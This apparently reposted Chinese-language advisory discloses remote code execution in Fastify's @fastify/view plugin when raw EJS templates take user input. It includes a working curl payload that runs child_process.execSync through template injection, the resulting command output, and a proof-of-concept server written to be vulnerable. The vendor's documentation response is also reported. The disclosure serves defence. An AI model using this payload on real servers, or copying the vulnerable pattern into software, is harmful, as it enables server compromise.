#  通过@fastify/view raw 渲染实现远程代码执行   
 Ots安全   2025-05-06 06:25  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
供应商： Fastify  
  
组件： @fastify/view  
  
影响：远程代码执行（RCE）  
  
发现者： Oblivionsage  
  
供应商确认：是（通过 HackerOne 上的公开评论）  
> 截至 2025 年 5 月，Fastify 已更新其文档并发出明确警告：  
>   
> 请勿将原始内容与不受信任的内容一起使用，否则您将容易受到远程代码执行（RCE）攻击。  
>   
> GitHub PR：fastify/point-of-view#475  
  
  
漏洞摘要  
  
Fastify 的@fastify/view插件允许使用 进行原始模板渲染raw: true。当与EJS  
  
和不受信任的用户输入 一起使用时，将导致远程代码执行。  
  
Fastify 自己的测试文件在没有警告的情况下展示了这种使用模式，  
  
这可能会误导开发人员相信危险行为。  
  
远程代码执行（RCE）  
  
该@fastify/view插件与 EJS 引擎和reply.view({ raw: <user-controlled-string> })相关模式配合使用时，允许任意 EJS 执行。当攻击者能够控制raw传递给视图渲染器的内容时，这会导致远程代码执行 (RCE)。此漏洞源于 Fastify 信任未经任何清理或限制的原始模板字符串，并将其直接传递给 EJS 的compile()方法。  
  
这是实际使用的有效载荷的最小示例：  
  
```
curl -X POST http://localhost:3000/render \  -H "Content-Type: application/x-www-form-urlencoded" \  --data-urlencode 'text=<%= require("child_process").execSync("id").toString() %>'
```  
  
  
输出：  
  
```
uid=1000(nullprophet) gid=1000(nullprophet) groups=...
```  
  
  
截屏：curl.png  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadibXd1zjP4OqYagU8JzasTMvibSAlDg4u5ByJfl7hdTBIG1bKUAocuoFXhbOdGQRcLqKvejyjD4T7w/640?wx_fmt=png&from=appmsg "")  
  
这通过模板逻辑证实了完整的 RCE — 与您的官方示例相匹配（例如reply.view({ raw })）。  
  
这将在服务器上执行任意命令并返回结果。服务器端代码默认不包含此逻辑——它只是将不受信任的输入传递给rawEJS 上下文。  
  
该漏洞的工作原理如下：  
  
我们复制了文档中提到的模式，并允许通过 POST /render 进行原始 EJS 注入。以下是使用的 PoC 服务器代码：  
  
```
// Based on official Fastify repo usage of raw templates:// https://github.com/fastify/point-of-view/blob/master/test/test-ejs.jsconst fastify = require('fastify')();const ejs = require('ejs');const formBody = require('@fastify/formbody');const view = require('@fastify/view');fastify.register(formBody); // Needed to parse POST x-www-form-urlencodedfastify.register(view, {  engine: { ejs }});// Renders raw EJS passed via POST parameter 'text'fastify.post('/render', (req, reply) => {const template = req.body.text;// Pass 'require' to the template contextreturn reply.view({ raw: template }, { require }, { async: false });});fastify.listen({ port: 3000 }, err => {if (err) throw err;console.log('Listening on http://localhost:3000');});
```  
  
  
基于 Fastify 自己的示例代码  
  
该设置直接基于 Fastify 官方point-of-view仓库中的真实示例。具体如下：  
  
```
https://github.com/fastify/point-of-view/blob/master/test/test-ejs.jsreply.view({ raw: fs.readFileSync('./templates/index.ejs', 'utf8') }, data)
```  
  
  
在我们的 PoC 中，我们使用了这种方法：  
  
```
reply.view({ raw: template }, { require }, { async: false });
```  
  
  
这种用法raw存在于代码库的多个地方，包括README.md、测试文件和示例模板。  
  
依恋：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadibXd1zjP4OqYagU8JzasTMiacZMbPRLHo9o4U6CCcUPtiaZia2bhGjETWBhgEKZxIUib1CXAoJgIPhDg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadibXd1zjP4OqYagU8JzasTMOUTMmX48jo1VHGpH0aNlBOWwW0hf8MvmGs7C5rWSicg4Kf1F65bsOIA/640?wx_fmt=png&from=appmsg "")  
  
为什么这很重要  
  
这里需要关注的不是 Fastify 本身执行命令，而是 Fastify 的视图插件：  
  
接受无限制的原始模板输入  
  
编译并执行，无任何警告或清理  
  
允许开发人员在使用此模式时不知不觉地将自己暴露于 RCE  
  
这种行为正是导致模板注入在现代应用程序中存在风险的原因。  
  
供应商回应：  
  
Fastify 团队承认存在风险，但选择不应用代码级补丁。  
  
随后，Fastify 更新了其官方文档，明确警告使用不受信任的原始输入的危险：  
  
“请勿将原始内容与不受信任的内容一起使用，否则您将容易受到远程代码执行（RCE）攻击。  
  
GitHub PR：fastify/point-of-view[#475]()  
  
  
— Fastify 文档（2025 年 5 月）。  
> ⚠️此 PoC 仅用于合法安全研究。请勿在您不拥有或未获得明确测试许可的系统上使用它。  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
  
